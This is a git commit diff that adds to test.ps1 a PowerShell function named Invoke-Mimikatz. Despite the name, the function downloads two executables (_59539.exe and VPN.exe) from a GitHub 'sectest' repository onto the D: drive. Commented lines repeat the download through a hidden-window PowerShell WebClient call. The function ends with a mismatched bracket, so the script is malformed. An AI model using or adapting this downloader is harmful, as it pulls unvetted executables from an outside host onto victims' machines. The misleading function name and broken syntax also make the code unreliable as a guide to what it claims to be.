5c66c3d0be1fdb9ec7f84321fe0401faa1bd9834
foryou123 <hiforyou@yeah.net>
2018-03-21 13:38:43 +0800

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,1 +1,13 @@
 
+function Invoke-Mimikatz
+{
+  $url1 = "https://raw.githubusercontent.com/foryou123/sectest/master/_59539.exe"
+  $url2 = "https://raw.githubusercontent.com/foryou123/sectest/master/VPN.exe"
+  #powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/foryou123/sectest/master/_59539.exe', 'D:\\_59539.exe')
+  #powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/foryou123/sectest/master/VPN.exe', 'D:\\_VPN.exe')
+  $des1 = "D:\\_59539.exe"
+  $des2 = "D:\\_VPN.exe"
+  Invoke-WebRequest -uri $url1 -OutFile $des1
+  Invoke-WebRequest -uri $url2 -OutFile $des2
+
+)
